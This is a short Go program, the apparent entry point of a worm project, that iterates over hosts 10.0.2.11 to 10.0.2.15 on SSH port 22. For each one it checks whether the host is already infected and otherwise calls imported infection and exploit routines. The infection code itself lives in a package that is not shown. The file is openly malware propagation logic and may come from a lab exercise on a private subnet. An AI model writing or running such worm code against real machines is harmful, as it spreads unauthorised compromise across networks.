package main

import (
	"fmt"
  	"strconv"
	"github.com/99graciamanel/mlw/worm/infection"
)

func main() {
	nAttackers := 5
	for i := 11; i < nAttackers + 11; i++ {
		ip_port := "10.0.2." +  strconv.Itoa(i) + ":22"
		is_infected := infection.SshCheckInfection(ip_port)
		fmt.Println(is_infected)
		if is_infected {
			return
		}
		message := infection.SshInfect(ip_port)
		fmt.Println(message)
		message = infection.SshExploit(ip_port)
		fmt.Println(message)
	}
}
